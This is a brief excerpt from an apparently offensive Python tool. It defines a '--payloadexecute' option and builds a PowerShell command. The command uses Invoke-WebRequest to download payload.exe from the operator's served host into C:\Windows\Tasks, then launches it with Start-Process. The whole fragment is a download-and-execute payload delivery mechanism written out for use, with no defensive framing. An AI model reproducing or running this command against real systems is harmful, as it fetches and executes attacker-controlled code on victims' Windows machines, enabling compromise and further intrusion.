...
parser.add_argument(
    "--payloadexecute",
    "-px",
    default="http://{serve_host}:{args.port}/payload.exe",
    help="direct link to your payload.exe (default: hosted on local server)",
)
...
def main(args):
    ...
    if args.payloadexecute:
        command = f"""Invoke-WebRequest http://{serve_host}:{args.port}/payload.exe -OutFile C:\\Windows\\Tasks\\payload.exe; Start-Process C:\\Windows\\Tasks\\payload.exe"""
